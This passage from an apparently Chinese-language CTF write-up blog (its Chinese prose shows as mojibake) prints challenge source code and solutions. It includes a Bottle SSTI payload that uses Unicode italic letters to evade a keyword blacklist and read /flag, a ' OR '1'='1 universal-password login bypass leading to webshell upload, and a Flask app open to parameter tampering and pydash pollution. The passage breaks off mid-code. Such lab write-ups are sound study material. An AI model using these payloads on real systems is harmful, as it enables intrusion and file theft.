&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;ğŸ“¤ ä¸Šä¼ ZIPæ–‡ä»¶&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;é€‰æ‹©ZIPæ–‡ä»¶ï¼ˆæœ€å¤§1MBï¼‰&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;ä»…æ”¯æŒ.zipæ ¼å¼çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å¤§å°ä¸è¶…è¿‡1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“¤ ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        â†©ï¸ è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†æ–‡ä»¶ä¸Šä¼ &quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;è¯·ä¸Šä¼ æœ‰æ•ˆçš„ZIPæ–‡ä»¶&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;å¤„ç†ZIPæ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ æˆåŠŸ&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;âœ… ä¸Šä¼ æˆåŠŸ!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            âœ… æ–‡ä»¶å·²æˆåŠŸä¸Šä¼ å¹¶è§£å‹</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;ğŸ“„ &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    æŸ¥çœ‹</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ‘€ æŸ¥çœ‹ç¬¬ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        â• ä¸Šä¼ å¦ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ğŸ  è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯·æ±‚çš„è·¯å¾„ä¸æ˜¯æ–‡ä»¶&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;éæ³•è®¿é—®å°è¯•&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶å†…å®¹åŒ…å«ä¸å…è®¸çš„å…³é”®è¯&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é™æ€æ–‡ä»¶æœåŠ¡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;è®¨åŒå•¦ä¸æ˜¯è¯´å¥½åªçœ‹çœ‹ä¸æ‘¸çš„å—&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ä¸è¦é€è¿›æ¥å•Šå•Šå•Šå•Š&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åŸç¥ï¼Œå¯åŠ¨!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>bottleæ¡†æ¶ä¸‹çš„sstiæ–œä½“å­—ç›´æ¥ç»•è¿‡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;â„´ğ“…â„¯ğ“ƒ(&#x27;/flag&#x27;).ğ“‡â„¯ağ’¹()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="flagåˆ°åº•åœ¨å“ª"><a href="#flagåˆ°åº•åœ¨å“ª" class="headerlink" title="flagåˆ°åº•åœ¨å“ª"></a>flagåˆ°åº•åœ¨å“ª</h2><p>&#x2F;robots.txtå¾—åˆ°&#x2F;admin&#x2F;login.phpï¼Œç„¶åæ˜¯ä¸€ä¸ªç™»å½•æ¡†</p><p><img src="/../images/achieve/2025/11/image-20251202214820781.png" alt="image-20251202214820781"></p><p>è¿™é‡Œæœ‰ä¸ªhintï¼Œè¿˜ä»¥ä¸ºæ˜¯å¼±å£ä»¤ï¼Œæ²¡è·‘å‡ºæ¥ï¼sqlæ³¨å…¥ä¹Ÿæµ‹ä¸å‡ºæ¥ï¼åé¢æ”¾äº†ä¸ªhint</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°è“é²¨è¯´è´¦æˆ·å¿…é¡»æ˜¯adminå“¦ï¼Œä¸è¦åœ¨ç”¨æˆ·åä¸Šåšå°è¯•å•¦! å¦‚æœè¦ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦è¯·ä½¿ç”¨å¤§å†™</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœå·²ç»ç™»å½•ï¼Œç›´æ¥è·³è½¬åˆ° upload.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: upload.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /upload.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;âŒ ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‡ªå·±çœ‹å§ï¼Œæˆ‘ä¹Ÿä¸å¥½è¯´ä»€ä¹ˆäº†ï¼Œä¸€ä¸ªç™»å½•æ¡†æ²¡æœ‰å¸¦å…¥æ•°æ®åº“ï¼Œä¸ªäººæ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½è¿™é‡Œï¼Œä¼°è®¡æ˜¯æƒ³è€ƒä¸‡èƒ½å¯†ç </p><p><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND password = &#39;[ç”¨æˆ·è¾“å…¥çš„å¯†ç ]&#39;</code></p><p>ç„¶åæ‹¼æ¥ä¸Šå»ï¼Œä½†æ˜¯å®ƒè¿™è€ƒçš„ä¸å¤ªè¡Œï¼Œä¸‡èƒ½å¯†ç åˆä¸æ˜¯åªèƒ½é‚£æ ·ç”¨ï¼Œå¦‚æœsqlè¯­å¥é•¿è¿™æ ·æˆ‘è‚¯å®šå¯ä»¥åœ¨ç”¨æˆ·é‚£é‡Œå°±èƒ½ç”¨å•Šï¼ç™»å½•ä¸Šå»å°±æ˜¯æ— ä»»ä½•è¿‡æ»¤çš„webshellä¸Šä¼ ï¼Œä¹‹åæ‹¿flagå°±è¡Œï¼</p><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p>æŠ“åŒ…å…·ä½“é‚£ä¸ªåŒ…è‡ªå·±å»è¯•ä¸€è¯•ï¼Œåæ­£è¿™æ˜¯ä¿¡æ¯æ”¶é›†çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä¹Ÿæ‡’çš„å†å»åšä¸€éäº†ï¼Œç„¶åæ”¹äº†ä¸ªå‚æ•°type&#x3D;0ï¼Œè¶Šæƒåˆ°ç®¡ç†å‘˜ï¼Œæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å‰åå¯†ç ä¸ä¸€è‡´ï¼Œè¯·ç¡®è®¤åé‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span 